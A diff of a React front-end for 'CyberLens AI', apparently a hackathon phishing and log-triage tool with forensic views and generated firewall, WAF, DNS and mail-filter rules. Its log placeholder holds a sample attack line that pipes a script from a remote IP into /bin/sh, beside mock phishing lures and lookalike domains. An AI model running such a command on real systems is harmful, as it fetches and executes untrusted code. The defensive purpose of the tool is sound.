+              <span className="cell-label">REPLY-TO ROUTING DELTA</span>
+              <span className={`cell-value ${emailTriggers.replyTo.includes('@') ? 'warn' : 'safe'}`}>
+                {emailTriggers.replyTo}
+              </span>
+            </div>
+            <div className="anatomy-cell" style={{ gridColumn: 'span 2' }}>
+              <span className="cell-label">DETECTED PSYCHOLOGICAL TRIGGERS</span>
+              <div className="tag-cloud">
+                {emailTriggers.urgencyWords.length > 0 ? (
+                  emailTriggers.urgencyWords.map(word => (
+                    <span key={word} className="lure-badge">⚡ {word.toUpperCase()}</span>
+                  ))
+                ) : (
+                  <span className="cell-value safe">No high-urgency keywords detected</span>
+                )}
+              </div>
+            </div>
+          </>
+        )}
+
+        {inputType === 'log' && logIndicators && (
+          <>
+            <div className="anatomy-cell">
+              <span className="cell-label">SOURCE IP ADDRESS</span>
+              <span className="cell-value danger">{logIndicators.ips.join(', ') || 'Internal'}</span>
+            </div>
+            <div className="anatomy-cell">
+              <span className="cell-label">FAILED AUTH EVENTS</span>
+              <span className="cell-value warn">{logIndicators.failedCount} Auth Failures</span>
+            </div>
+            <div className="anatomy-cell" style={{ gridColumn: 'span 2' }}>
+              <span className="cell-label">MITRE ATT&CK TACTICS</span>
+              <div className="tag-cloud">
+                <span className="mitre-badge">T1110.001 Brute Force</span>
+                {logIndicators.tools.length > 0 && <span className="mitre-badge">T1059 Command Shell</span>}
+                <span className="mitre-badge">T1078 Valid Accounts</span>
+              </div>
+            </div>
+          </>
+        )}
+      </div>
+    </div>
+  )
+}
+
+// ─── Virtual Airgapped Detonation Chamber ─────────────────────────────────────
+function SandboxDetonationChamber({ inputType, risk }) {
+  const isDanger = risk === 'high'
+
+  return (
+    <div className="detonation-chamber">
+      <div className="chamber-bar">
+        <span>quarantine://isolated-runtime/{inputType}-preview</span>
+        <span className="chamber-lock">{isDanger ? '☣️ MALICIOUS VECTOR INTERCEPTED' : '🛡️ RUNTIME ISOLATED'}</span>
+      </div>
+
+      <div className="chamber-viewport">
+        <div className="phish-mock-window">
+          <div className="mock-logo">Corporate Access Portal</div>
+          <p className="mock-copy">
+            "Your executive token has expired. Re-authenticate credentials to verify payroll."
+          </p>
+          <div className="mock-input">admin@company-network.com</div>
+          <div className="mock-input">••••••••••••••••</div>
+          <div className="mock-submit">Verify Identity</div>
+          <div className="exfil-chain-alert">
+            ↳ <strong>ADVERSARY EXFILTRATION CHAIN:</strong> Submits authentication payload directly to unverified C2 domain via unencrypted POST.
           </div>
-        ))}
-        <div className="terminal-line">
-          <span className="terminal-prompt">$</span>
-          <span className={`terminal-cursor ${cursor ? 'cursor-on' : ''}`}>▌</span>
         </div>
       </div>
     </div>
   )
 }
 
+// ─── 1-Click Automated Defense Rules Generator ────────────────────────────────
+function AutomatedDefenseRules({ text, onCopyRule, copied }) {
+  const [activeRuleTab, setActiveRuleTab] = useState('firewall')
+
+  const extractedIp = useMemo(() => {
+    const match = text.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/)
+    return match ? match[0] : '185.220.101.8'
+  }, [text])
+
+  const extractedHost = useMemo(() => {
+    try {
+      const candidate = text.trim().split(/\s+/)[0]
+      const url = new URL(candidate.includes('://') ? candidate : `http://${candidate}`)
+      return url.hostname
+    } catch {
+      return 'paypaI-account.co'
+    }
+  }, [text])
+
+  const rules = {
+    firewall: {
+      name: 'Linux iptables / UFW',
+      code: `# CyberLens Architectural Mitigation Rule
+sudo iptables -A INPUT -s ${extractedIp} -j DROP
+sudo ufw deny from ${extractedIp} to any
+sudo fail2ban-client set sshd banip ${extractedIp}`
+    },
+    waf: {
+      name: 'Cloudflare WAF Expression',
+      code: `(http.host eq "${extractedHost}" or ip.src eq ${extractedIp}) and not cf.client.bot`
+    },
+    dns: {
+      name: 'DNS Sinkhole (Pi-hole / Unbound)',
+      code: `# Blackhole poisoned routing
+0.0.0.0 ${extractedHost}
+0.0.0.0 *.${extractedHost}`
+    },
+    postfix: {
+      name: 'Postfix Mail Header Regex',
+      code: `# /etc/postfix/header_checks
+/^From:.*(paypa[iI]|verify|account-alert)/ REJECT 554 5.7.1 CyberLens Phish Blocked`
+    }
+  }
+
+  return (
+    <div className="defense-rules-sheet">
+      <div className="defense-subtabs">
+        {Object.entries(rules).map(([key, item]) => (
+          <button
+            key={key}
+            className={`subtab-pen-btn ${activeRuleTab === key ? 'active' : ''}`}
+            onClick={() => {
+              audio.play('click')
+              setActiveRuleTab(key)
+            }}
+          >
+            {item.name}
+          </button>
+        ))}
+      </div>
+
+      <div className="code-rule-display">
+        <button
+          className="rule-copy-float"
+          onClick={() => onCopyRule(rules[activeRuleTab].code)}
+        >
+          {copied ? '✓ Copied' : 'Copy Snippet'}
+        </button>
+        <code>{rules[activeRuleTab].code}</code>
+      </div>
+    </div>
+  )
+}
+
+// ─── Terminal Scan Live Stream ────────────────────────────────────────────────
+function TerminalScan() {
+  const [lines, setLines] = useState([SCAN_LINES[0]])
+  const [cursor, setCursor] = useState(true)
+
+  useEffect(() => {
+    audio.play('scan')
+    let lineIndex = 1
+    const lineTimer = setInterval(() => {
+      if (lineIndex < SCAN_LINES.length) {
+        setLines(prev => [...prev, SCAN_LINES[lineIndex]])
+        audio.play('click')
+        lineIndex++
+      }
+    }, 380)
+    const cursorTimer = setInterval(() => setCursor(c => !c), 400)
+    return () => {
+      clearInterval(lineTimer)
+      clearInterval(cursorTimer)
+    }
+  }, [])
+
+  return (
+    <div className="terminal-stream-wrap" aria-live="polite" aria-label="Inspection matrix in progress">
+      <div className="terminal-stream-head">
+        <div className="terminal-dots">
+          <span className="terminal-dot" />
+          <span className="terminal-dot" />
+          <span className="terminal-dot" />
+        </div>
+        <span>CYBERLENS ARCHITECTURAL CORE v2.4 // TELEMETRY RUNTIME</span>
+      </div>
+      <div className="terminal-stream-body">
+        {lines.map((line, i) => (
+          <div key={i} className="stream-line">
+            <span className="stream-prompt">&gt;</span>
+            <span>{line}</span>
+          </div>
+        ))}
+        <div className="stream-line">
+          <span className="stream-prompt">&gt;</span>
+          <span className={`stream-cursor ${cursor ? 'on' : ''}`}>█</span>
+        </div>
+      </div>
+    </div>
+  )
+}
+
+// ─── Main Architectural Application ───────────────────────────────────────────
 function App() {
+  const [theme, setTheme] = useState(() => localStorage.getItem('cyberlens-theme') || 'parchment')
+  const [particlesEnabled, setParticlesEnabled] = useState(true)
+  const [particleMode, setParticleMode] = useState('idle')
+  const [soundEnabled, setSoundEnabled] = useState(true)
+
   const [inputType, setInputType] = useState('url')
   const [text, setText] = useState('')
   const [status, setStatus] = useState('idle')
   const [result, setResult] = useState(null)
   const [error, setError] = useState('')
+  const [activeSheetTab, setActiveSheetTab] = useState('overview') // 'overview' | 'forensics' | 'sandbox' | 'defense'
   const [history, setHistory] = useState(() => {
-    try { return JSON.parse(localStorage.getItem('cyberlens-history') || '[]') } catch { return [] }
+    try {
+      return JSON.parse(localStorage.getItem('cyberlens-history') || '[]')
+    } catch {
+      return []
+    }
   })
   const [copied, setCopied] = useState(false)
-  const [toastVisible, setToastVisible] = useState(false)
   const [toastMsg, setToastMsg] = useState('')
-  const [sidebarOpen, setSidebarOpen] = useState(false)
+  const [toastVisible, setToastVisible] = useState(false)
+
   const inputRef = useRef(null)
   const resultRef = useRef(null)
 
+  // Sync theme
+  useEffect(() => {
+    document.documentElement.setAttribute('data-theme', theme)
+    localStorage.setItem('cyberlens-theme', theme)
+  }, [theme])
+
+  // Save history
   useEffect(() => {
     localStorage.setItem('cyberlens-history', JSON.stringify(history.slice(0, 5)))
   }, [history])
 
-  // Ctrl+Enter to submit
+  // Toast handler
+  const showToast = useCallback(msg => {
+    setToastMsg(msg)
+    setToastVisible(true)
+    setTimeout(() => setToastVisible(false), 2800)
+  }, [])
+
+  // Keyboard shortcut Ctrl+Enter
   useEffect(() => {
     function handleKeyDown(e) {
       if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
@@ -199,57 +854,106 @@ function App() {
     return () => window.removeEventListener('keydown', handleKeyDown)
   })
 
-  const showToast = useCallback((msg) => {
-    setToastMsg(msg)
-    setToastVisible(true)
-    setTimeout(() => setToastVisible(false), 3000)
-  }, [])
+  function toggleTheme() {
+    audio.play('click')
+    setTheme(t => (t === 'parchment' ? 'blueprint' : 'parchment'))
+  }
 
-  const ready = text.trim().length > 0 && status !== 'loading'
-  const inputMeta = typeInfo[inputType]
-  const wordCount = useMemo(() => text.trim() ? text.trim().split(/\s+/).length : 0, [text])
-  const charCount = text.length
-  const charRemaining = 6000 - charCount
+  function toggleParticles() {
+    audio.play('click')
+    setParticlesEnabled(p => !p)
+  }
+
+  function toggleAudio() {
+    audio.enabled = !soundEnabled
+    setSoundEnabled(!soundEnabled)
+    if (!soundEnabled) audio.play('click')
+  }
+
+  const wordCount = useMemo(() => (text.trim() ? text.trim().split(/\s+/).length : 0), [text])
+  const charRemaining = 6000 - text.length
 
   function chooseType(type) {
+    audio.play('click')
     setInputType(type)
     setResult(null)
     setError('')
+    setParticleMode('idle')
     inputRef.current?.focus()
   }
 
-  function fillExample(type = inputType) {
-    setInputType(type)
-    setText(examples[type])
+  function fillPreset(preset) {
+    audio.play('click')
+    setInputType(preset.type)
+    setText(preset.payload)
     setResult(null)
     setError('')
+    setParticleMode('idle')
+    showToast(`Loaded preset: ${preset.title}`)
     setTimeout(() => inputRef.current?.focus(), 0)
   }
 
   async function analyze() {
     if (!text.trim()) {
-      setError('Add something to inspect first — a URL, email, or a short log excerpt.')
+      audio.play('danger')
+      setError('Please provide a URL, email, or log excerpt for forensic triage.')
       inputRef.current?.focus()
       return
     }
+
+    audio.play('scan')
     setStatus('loading')
     setError('')
     setResult(null)
+    setParticleMode('scanning')
+
     try {
       const response = await fetch(`${API_BASE}/api/analyze`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ text: text.trim(), input_type: inputType })
       })
+
       const payload = await response.json().catch(() => ({}))
-      if (!response.ok) throw new Error(payload.detail || 'The service could not complete this check.')
+      if (!response.ok) {
+        throw new Error(payload.detail || 'Service inspection failed.')
+      }
+
       setResult(payload)
-      setHistory(current => [{ id: payload.id || String(Date.now()), type: inputType, risk: payload.risk, summary: payload.summary, at: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) }, ...current.filter(item => item.summary !== payload.summary)].slice(0, 5))
-      showToast('Scan complete — results ready')
-      // Auto-scroll to results
-      setTimeout(() => resultRef.current?.scrollIntoView({ behavior: 'smooth', block: 'start' }), 150)
-    } catch (requestError) {
-      setError(requestError.message || 'Connection failed. Confirm the CyberLens API is running, then try again.')
+      setHistory(prev => [
+        {
+          id: payload.id || String(Date.now()),
+          type: inputType,
+          risk: payload.risk,
+          summary: payload.summary,
+          at: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
+        },
+        ...prev.filter(item => item.summary !== payload.summary)
+      ].slice(0, 5))
+
+      if (payload.risk === 'low') {
+        audio.play('safe')
+        setParticleMode('safe')
+        confetti({
+          particleCount: 50,
+          spread: 70,
+          origin: { y: 0.65 },
+          colors: ['#0F766E', '#10B981', '#38BDF8', '#D92D20']
+        })
+      } else if (payload.risk === 'medium') {
+        audio.play('click')
+        setParticleMode('medium')
+      } else {
+        audio.play('danger')
+        setParticleMode('danger')
+      }
+
+      showToast(`Scan complete: ${payload.risk.toUpperCase()} risk assessed`)
+      setTimeout(() => resultRef.current?.scrollIntoView({ behavior: 'smooth', block: 'start' }), 200)
+    } catch (err) {
+      audio.play('danger')
+      setParticleMode('idle')
+      setError(err.message || 'API connection failed. Verify FastAPI backend is running.')
     } finally {
       setStatus('idle')
     }
@@ -257,240 +961,515 @@ function App() {
 
   function copyReport() {
     if (!result) return
-    const report = `CyberLens AI • ${result.risk?.toUpperCase()} RISK\n\n${result.summary}\n\nEvidence:\n${result.findings.map(item => `• ${item.title}: ${item.detail}`).join('\n')}\n\nRecommended next steps:\n${result.actions.map(item => `• ${item}`).join('\n')}`
-    navigator.clipboard?.writeText(report).then(() => {
+    audio.play('click')
+    const dossierText = `CYBERLENS AI • CLASSIFIED INCIDENT DOSSIER
+==================================================
+REF NONCE: ${result.id || 'N/A'}
+RISK ASSESSMENT: ${result.risk?.toUpperCase()}
+CONFIDENCE RATING: ${result.confidence}%
+INPUT VECTOR: ${result.analysis_type?.toUpperCase()}
+INSPECTION ENGINE: ${result.source === 'openai' ? 'OpenAI GPT-4o-mini' : 'Deterministic Structural Heuristic Kernel'}
+
+EXECUTIVE SUMMARY:
+${result.summary}
+
+FORENSIC EVIDENCE BREAKDOWN:
+${result.findings.map((f, i) => `[0${i + 1}] ${f.title}\n     ${f.detail}`).join('\n\n')}
+
+INCIDENT CONTAINMENT RUNBOOK:
+${result.actions.map((a, i) => `${i + 1}. ${a}`).join('\n')}
+==================================================
+Generated by CyberLens AI (PromptWars 2026 Edition)`
+
+    navigator.clipboard?.writeText(dossierText).then(() => {
       setCopied(true)
-      setTimeout(() => setCopied(false), 1500)
+      showToast('Forensic Dossier Copied to Clipboard')
+      setTimeout(() => setCopied(false), 2000)
+    })
+  }
+
+  function copyRuleSnippet(code) {
+    audio.play('click')
+    navigator.clipboard?.writeText(code).then(() => {
+      setCopied(true)
+      showToast('Perimeter Rule Copied')
+      setTimeout(() => setCopied(false), 2000)
     })
   }
 
   return (
     <div className="app-shell">
-      {/* Mobile hamburger overlay */}
-      {sidebarOpen && <div className="sidebar-overlay" onClick={() => setSidebarOpen(false)} aria-hidden="true" />}
+      {/* Background Reactive Dynamic Particle & Ink Field */}
+      <ThreatParticleCanvas mode={particleMode} enabled={particlesEnabled} theme={theme} />
 
-      <aside className={`sidebar ${sidebarOpen ? 'sidebar-open' : ''}`} aria-label="Primary navigation">
-        <a className="brand" href="#workspace" aria-label="CyberLens home">
-          <span className="brand-mark"><Icon name="shield" size={21} /></span>
-          <span>cyber<span>lens</span></span>
-        </a>
-        <nav className="side-nav">
-          <a className="nav-item active" href="#workspace"><Icon name="grid" />Workspace</a>
-          <a className="nav-item" href="#scanner"><Icon name="scan" />Scanner <span className="nav-status">Live</span></a>
-          <a className="nav-item" href="#history"><Icon name="history" />History</a>
-          <a className="nav-item" href="#guide"><Icon name="book" />Launch guide</a>
-        </nav>
-        <div className="side-bottom">
-          <a className="nav-item" href="#settings"><Icon name="gear" />Settings</a>
-          <div className="privacy-lock"><Icon name="shield" size={15} /><span><strong>Private by design</strong><small>Inputs are not saved</small></span></div>
-        </div>
-      </aside>
+      {/* Top Drafting Masthead */}
+      <header className="architect-masthead">
+        <div className="masthead-inner">
+          <div className="masthead-brand">
+            <ArchitecturalLensMark size={30} />
+            <div className="brand-titles">
+              <span className="brand-logotype">CYBER<em>LENS</em></span>
+              <span className="brand-subline">AI SECURITY CO-PILOT</span>
+            </div>
+          </div>
 
-      <main className="main" id="workspace">
-        <header className="topbar">
-          <div className="topbar-left">
-            <button className="hamburger" aria-label="Toggle navigation" onClick={() => setSidebarOpen(v => !v)}>
-              <Icon name={sidebarOpen ? 'x' : 'menu'} size={20} />
+          <div className="masthead-telemetry">
+            <div className="telemetry-tag">
+              <span className="pulse-dot" />
+              <span>ZERO-RETENTION VAULT // EPHEMERAL</span>
+            </div>
+            <span>REG: 0x88F4</span>
+          </div>
+
+          <div className="masthead-actions">
+            <button
+              className={`draft-pill-btn ${particlesEnabled ? 'active' : ''}`}
+              onClick={toggleParticles}
+              title="Toggle Fluid Threat Particles"
+            >
+              <span>PARTICLES: {particlesEnabled ? 'ON' : 'OFF'}</span>
             </button>
-            <div className="crumb"><span>Workspace</span><Icon name="chevron" size={14} /><strong>New analysis</strong></div>
-          </div>
-          <div className="top-actions">
-            <span className="connection"><i />Protected session</span>
-            <button className="avatar" aria-label="Open profile">AK</button>
-          </div>
-        </header>
 
-        <section className="hero" aria-labelledby="hero-title">
-          <div className="hero-grid-bg" aria-hidden="true" />
-          <div className="eyebrow"><Icon name="spark" size={15} />AI-assisted security review</div>
-          <h1 id="hero-title" className="glitch-target">See what's hiding<br /><em>in plain sight.</em></h1>
-          <p>Investigate a suspicious link, message, or event log. Get clear evidence and the right next move — never empty alarmism.</p>
+            <button
+              className={`draft-pill-btn ${soundEnabled ? 'active' : ''}`}
+              onClick={toggleAudio}
+              title="Toggle Tactile Audio FX"
+            >
+              <span>SOUND: {soundEnabled ? 'ON' : 'OFF'}</span>
+            </button>
+
+            <button
+              className="draft-pill-btn"
+              onClick={toggleTheme}
+              title="Switch Parchment / Blueprint Theme"
+            >
+              <span>THEME: {theme.toUpperCase()}</span>
+            </button>
+          </div>
+        </div>
+      </header>
+
+      {/* Main Drafting Workbench Canvas */}
+      <main className="main-canvas">
+        {/* Asymmetric Pen-Drawn Hero Masthead */}
+        <section className="hero-editorial" aria-label="System Masthead">
+          <div className="hero-content">
+            <div className="hero-eyebrow">
+              <span className="hero-eyebrow-line" />
+              <span>FORENSIC TELEMETRY & ATTACK TRIAGE</span>
+            </div>
+
+            <h1 className="hero-title">
+              Forensic truth,<br />
+              <em>drawn with precision.</em>
+            </h1>
+
+            <p className="hero-lead">
+              A high-precision cybersecurity co-pilot fusing <strong>deterministic structural heuristics</strong> with{' '}
+              <strong>model-assisted forensic reasoning</strong>. Inspect URLs, phishing headers, and auth logs with
+              mathematical Shannon entropy and zero data retention.
+            </p>
+
+            <div className="hero-spec-strip">
+              <div className="spec-item">
+                <span className="spec-label">DETECTION KERNEL</span>
+                <span className="spec-val">40+ Structural Rules</span>
+              </div>
+              <div className="spec-item">
+                <span className="spec-label">FALLBACK RESILIENCE</span>
+                <span className="spec-val">0.0s Airgap Ready</span>
+              </div>
+              <div className="spec-item">
+                <span className="spec-label">PRIVACY ASSURANCE</span>
+                <span className="spec-val">100% Zero-Retention</span>
+              </div>
+              <div className="spec-item">
+                <span className="spec-label">ANALYSIS METHOD</span>
+                <span className="spec-val">Shannon + MITRE ATT&CK</span>
+              </div>
+            </div>
+          </div>
+
+          {/* Right Side: Dynamic Threat DNA Sequencer */}
+          <ThreatDNASquencer
+            text={text}
+            inputType={inputType}
+            onSelectGene={gene => showToast(`${gene.label}: ${gene.desc}`)}
+          />
         </section>
 
-        <section className="workspace-grid">
-          <div className="scanner-panel" id="scanner">
-            <div className="panel-heading">
-              <div><span className="section-kicker">Threat inspector</span><h2>Start a focused review</h2></div>
-              <span className="privacy-note"><Icon name="shield" size={14} />Nothing is retained</span>
-            </div>
+        {/* Hackathon Judge Chaos Presets */}
+        <section className="chaos-section" aria-label="1-Click Judge Scenarios">
+          <div className="chaos-heading-row">
+            <h2>
+              <span>§ 02 // CHAOS ATTACK PRESETS</span>
+            </h2>
+            <span className="chaos-subtext">Click any payload to inject into inspection workbench</span>
+          </div>
 
-            <div className="type-tabs" role="tablist" aria-label="Content to analyze">
-              {Object.entries(typeInfo).map(([type, info]) => <button key={type} role="tab" aria-selected={inputType === type} className={inputType === type ? 'selected' : ''} onClick={() => chooseType(type)}><Icon name={info.icon} size={16} />{info.label}</button>)}
-            </div>
-
-            <label className={`input-wrap ${error ? 'has-error' : ''}`} htmlFor="scan-input">
-              <span className="input-label">{inputMeta.hint}</span>
-              <textarea id="scan-input" ref={inputRef} value={text} maxLength={6000} onChange={event => { setText(event.target.value); setError('') }} placeholder={inputType === 'url' ? 'https://example.com/sign-in' : inputType === 'email' ? 'Paste the message, including the sender and subject…' : 'Paste an authentication, endpoint, or application event…'} />
-              <span className="input-footer">
-                <span>{error ? <span className="input-error">{error}</span> : <>Sensitive details? Redact passwords and personal identifiers.</>}</span>
-                <span className="char-counter">
-                  <span>{wordCount} words</span>
-                  <span className={charRemaining < 200 ? 'char-warn' : ''}>{charRemaining.toLocaleString()} left</span>
-                </span>
-              </span>
-            </label>
-
-            <div className="scan-actions">
-              <button className="primary-button" onClick={analyze} disabled={!ready}>
-                <span>{status === 'loading' ? <span className="loader" /> : <Icon name="scan" size={18} />}</span>
-                {status === 'loading' ? 'Inspecting signals…' : 'Inspect for threats'}
-                <Icon name="arrow" size={17} />
+          <div className="chaos-cards-grid">
+            {CHAOS_PRESETS.map(preset => (
+              <button
+                key={preset.id}
+                className="chaos-card-btn"
+                onClick={() => fillPreset(preset)}
+              >
+                <div className="chaos-card-top">
+                  <span className={`chaos-badge-pill ${preset.badgeClass}`}>{preset.badge}</span>
+                  <span className="chaos-type-label">{preset.type.toUpperCase()}</span>
+                </div>
+                <h4>{preset.title}</h4>
+                <p>{preset.desc}</p>
+                <div className="chaos-card-action">
+                  <span>INJECT PAYLOAD</span>
+                  <span>→</span>
+                </div>
               </button>
-              <button className="example-button" onClick={() => fillExample()}><Icon name="spark" size={16} />Try an example</button>
-            </div>
-            <div className="kbd-hint" aria-hidden="true"><kbd>Ctrl</kbd><span>+</span><kbd>↵</kbd><span>to submit</span></div>
-
-            <div className="example-row"><span>Quick samples</span>{Object.entries(typeInfo).map(([type, info]) => <button key={type} onClick={() => fillExample(type)}><Icon name={info.icon} size={14} />{info.label}</button>)}</div>
-
-            {status === 'loading' && <TerminalScan />}
-
-            {result && <div ref={resultRef}><AnalysisResult result={result} copied={copied} onCopy={copyReport} /></div>}
+            ))}
           </div>
-
-          <GuidePanel />
         </section>
 
-        <section className="history-section" id="history">
-          <div className="history-heading">
-            <div><span className="section-kicker">This device</span><h2>Recent reviews</h2></div>
-            {history.length > 0 && <button className="text-button" onClick={() => setHistory([])}><Icon name="trash" size={15} />Clear history</button>}
-          </div>
-          {history.length ? (
-            <div className="history-list">
-              {history.map(item => (
-                <article className={`history-card risk-border-${item.risk}`} key={item.id}>
-                  <div className="history-icon"><Icon name={typeInfo[item.type]?.icon || 'scan'} size={17} /></div>
-                  <div className="history-content">
-                    <span>{typeInfo[item.type]?.label || 'Analysis'} · {item.at}</span>
-                    <p>{item.summary}</p>
-                    <div className="history-risk-bar">
-                      <div className={`history-risk-fill risk-fill-${item.risk}`} />
-                    </div>
-                  </div>
-                  <RiskBadge risk={item.risk} />
-                </article>
+        {/* Workspace Split: Drafting Workbench + Judge Dossier */}
+        <div className="workspace-split">
+          {/* Main Inspection Workbench */}
+          <section className="workbench-box" aria-label="Inspection Workbench">
+            <div className="workbench-header">
+              <div className="workbench-title-group">
+                <span className="workbench-kicker">WORKBENCH TELEMETRY</span>
+                <h2>Input Payload Vector</h2>
+              </div>
+              <div className="zero-leak-guarantee">
+                <span>🛡️ ZERO-RETENTION MEMORY</span>
+              </div>
+            </div>
+
+            {/* Input Vector Selectors */}
+            <div className="vector-tabs" role="tablist">
+              {Object.entries(typeInfo).map(([type, info]) => (
+                <button
+                  key={type}
+                  role="tab"
+                  aria-selected={inputType === type}
+                  className={`vector-tab-btn ${inputType === type ? 'active' : ''}`}
+                  onClick={() => chooseType(type)}
+                >
+                  <span>{info.label}</span>
+                  <span className="vector-badge">{info.tag}</span>
+                </button>
               ))}
             </div>
-          ) : (
-            <div className="empty-history">
-              <div><Icon name="history" size={21} /></div>
-              <span>Your completed reviews appear here on this device.</span>
+
+            {/* Text Editor Body */}
+            <div className="workbench-body">
+              <div className={`editor-field-wrap ${error ? 'error-state' : ''}`}>
+                <div className="editor-header-bar">
+                  <span>{typeInfo[inputType].hint}</span>
+                  <div className="entropy-meter-live">
+                    <span>Shannon Entropy:</span>
+                    <strong>{calculateShannonEntropy(text)} bits</strong>
+                    <span className={`entropy-tag-indicator ${calculateShannonEntropy(text) > 3.4 ? 'high' : 'low'}`}>
+                      {calculateShannonEntropy(text) > 3.4 ? 'HIGH DGA' : 'STANDARD'}
+                    </span>
+                  </div>
+                </div>
+
+                <textarea
+                  ref={inputRef}
+                  className="drafting-textarea"
+                  value={text}
+                  maxLength={6000}
+                  onChange={e => {
+                    setText(e.target.value)
+                    setError('')
+                  }}
+                  placeholder={
+                    inputType === 'url'
+                      ? 'https://secure-portal.paypaI-security.top/verify?token=session_expired'
+                      : inputType === 'email'
+                      ? 'From: Corporate HR <security@paypaI-account.co>\nSubject: Immediate action required within 30 minutes...'
+                      : 'Oct 30 04:12:01 sshd: Failed password for root from 185.220.101.8\ncurl http://185.220.101.8/stage2.sh | /bin/sh'
+                  }
+                />
+
+                <div className="editor-footer-bar">
+                  <div>
+                    {error ? (
+                      <span className="field-error-msg">{error}</span>
+                    ) : (
+                      <span>Memory space flushed immediately after request lifecycle.</span>
+                    )}
+                  </div>
+                  <div>
+                    <span>{wordCount} words • {charRemaining.toLocaleString()} chars left</span>
+                  </div>
+                </div>
+              </div>
+
+              {/* Action Buttons */}
+              <div className="workbench-actions-bar">
+                <div className="action-buttons-left">
+                  <button
+                    className="btn-primary-pen"
+                    onClick={analyze}
+                    disabled={!text.trim() || status === 'loading'}
+                  >
+                    <span>{status === 'loading' ? 'TRIAGING PAYLOAD...' : 'INSPECT FOR THREATS'}</span>
+                    <span>→</span>
+                  </button>
+
+                  <button
+                    className="btn-clear-pen"
+                    onClick={() => {
+                      audio.play('click')
+                      setText('')
+                      setResult(null)
+                      setError('')
+                      setParticleMode('idle')
+                    }}
+                    disabled={!text}
+                  >
+                    Clear
+                  </button>
+                </div>
+
+                <div className="kbd-shortcut-hint">
+                  <kbd>Ctrl</kbd> + <kbd>Enter</kbd> to inspect
+                </div>
+              </div>
             </div>
-          )}
-        </section>
+
+            {/* Live Streaming Terminal */}
+            {status === 'loading' && <TerminalScan />}
+
+            {/* Forensic Result Dossier */}
+            {result && (
+              <div ref={resultRef} className="result-dossier" aria-live="polite">
+                <div className="dossier-top-meta">
+                  <div className="dossier-headline-block">
+                    <div className="dossier-badge-row">
+                      <span className={`risk-tag ${result.risk}`}>
+                        {result.risk === 'high' ? 'CRITICAL MALICIOUS THREAT' : result.risk === 'medium' ? 'ELEVATED SUSPICION' : 'VERIFIED LOW RISK'}
+                      </span>
+                      <span className="engine-source-stamp">
+                        ENGINE: {result.source === 'openai' ? 'OPENAI GPT-4o-MINI' : 'DETERMINISTIC HEURISTICS'}
+                      </span>
+                    </div>
+                    <h2 className="dossier-title">
+                      {result.risk === 'high'
+                        ? 'Malicious Vector Intercepted'
+                        : result.risk === 'medium'
+                        ? 'Suspicious Anomalies Detected'
+                        : 'No Active Threat Signatures Found'}
+                    </h2>
+                  </div>
+
+                  <div className="dossier-actions">
+                    <button className="btn-export-dossier" onClick={copyReport}>
+                      <span>{copied ? '✓ Dossier Copied' : 'Export Dossier'}</span>
+                    </button>
+                    <span className="engine-source-stamp">SHA: {String(result.id || 'demo8824').slice(0, 8)}</span>
+                  </div>
+                </div>
+
+                {/* Caliper Vernier Confidence Gauge */}
+                <div className="caliper-gauge-strip">
+                  <div className="caliper-label-row">
+                    <span>PROBABILITY CONFIDENCE CALIPER</span>
+                    <strong>{result.confidence || 85}% CONFIDENCE</strong>
+                  </div>
+                  <div className="caliper-track">
+                    <div
+                      className={`caliper-fill ${result.risk}`}
+                      style={{ width: `${Math.max(12, Math.min(100, result.confidence || 85))}%` }}
+                    />
+                  </div>
+                </div>
+
+                {/* Technical Sub-Sheet Tabs */}
+                <div className="sheet-tabs">
+                  <button
+                    className={`sheet-tab-btn ${activeSheetTab === 'overview' ? 'active' : ''}`}
+                    onClick={() => {
+                      audio.play('click')
+                      setActiveSheetTab('overview')
+                    }}
+                  >
+                    <span>[ 01 / EXECUTIVE OVERVIEW ]</span>
+                  </button>
+                  <button
+                    className={`sheet-tab-btn ${activeSheetTab === 'forensics' ? 'active' : ''}`}
+                    onClick={() => {
+                      audio.play('click')
+                      setActiveSheetTab('forensics')
+                    }}
+                  >
+                    <span>[ 02 / FORENSIC LAB ]</span>
+                  </button>
+                  <button
+                    className={`sheet-tab-btn ${activeSheetTab === 'sandbox' ? 'active' : ''}`}
+                    onClick={() => {
+                      audio.play('click')
+                      setActiveSheetTab('sandbox')
+                    }}
+                  >
+                    <span>[ 03 / DETONATION CHAMBER ]</span>
+                  </button>
+                  <button
+                    className={`sheet-tab-btn ${activeSheetTab === 'defense' ? 'active' : ''}`}
+                    onClick={() => {
+                      audio.play('click')
+                      setActiveSheetTab('defense')
+                    }}
+                  >
+                    <span>[ 04 / DEFENSE AUTOMATION ]</span>
+                  </button>
+                </div>
+
+                {/* Tab Pane 1: Overview */}
+                {activeSheetTab === 'overview' && (
+                  <div className="sheet-panel">
+                    <div className="executive-summary-quote">
+                      "{result.summary}"
+                    </div>
+
+                    <div className="findings-numbered-stack">
+                      <div className="findings-header-row">
+                        <h3>Forensic Evidence Points ({result.findings.length})</h3>
+                        <span className="engine-source-stamp">ARCHIVAL INDEX</span>
+                      </div>
+
+                      {result.findings.map((item, index) => (
+                        <div key={index} className="finding-editorial-row">
+                          <span className="finding-giant-num">0{index + 1}</span>
+                          <div className="finding-body">
+                            <span className="finding-title-text">{item.title}</span>
+                            <p className="finding-detail-text">{item.detail}</p>
+                          </div>
+                        </div>
+                      ))}
+                    </div>
+
+                    <div className="containment-runbook">
+                      <div className="runbook-title">
+                        <span>RECOMMENDED INCIDENT CONTAINMENT ACTIONS</span>
+                      </div>
+                      <ol className="runbook-ol">
+                        {result.actions.map((act, index) => (
+                          <li key={index}>{act}</li>
+                        ))}
+                      </ol>
+                    </div>
+                  </div>
+                )}
+
+                {/* Tab Pane 2: Forensics */}
+                {activeSheetTab === 'forensics' && (
+                  <div className="sheet-panel">
+                    <ForensicAnatomyView text={text} inputType={inputType} />
+                  </div>
+                )}
+
+                {/* Tab Pane 3: Sandbox */}
+                {activeSheetTab === 'sandbox' && (
+                  <div className="sheet-panel">
+                    <SandboxDetonationChamber inputType={inputType} risk={result.risk} />
+                  </div>
+                )}
+
+                {/* Tab Pane 4: Defense Automation */}
+                {activeSheetTab === 'defense' && (
+                  <div className="sheet-panel">
+                    <AutomatedDefenseRules
+                      text={text}
+                      onCopyRule={copyRuleSnippet}
+                      copied={copied}
+                    />
+                  </div>
+                )}
+              </div>
